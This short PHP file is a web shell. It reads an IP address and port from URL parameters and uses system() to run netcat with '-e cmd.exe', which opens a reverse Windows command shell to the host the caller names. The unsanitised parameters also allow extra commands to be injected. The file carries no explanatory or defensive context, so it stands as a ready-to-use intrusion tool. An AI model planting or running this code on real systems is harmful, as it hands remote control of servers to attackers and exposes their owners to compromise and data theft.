<?php

$ip = $_GET["ip"];
$port = $_GET["port"];
$cmd = "nc -n -v " . $ip . " " . $port . " -e cmd.exe";
# $cmd = "nc " . $ip . " " . $port . " -e cmd.exe";

echo "Executing " . $cmd;
system($cmd);

?>
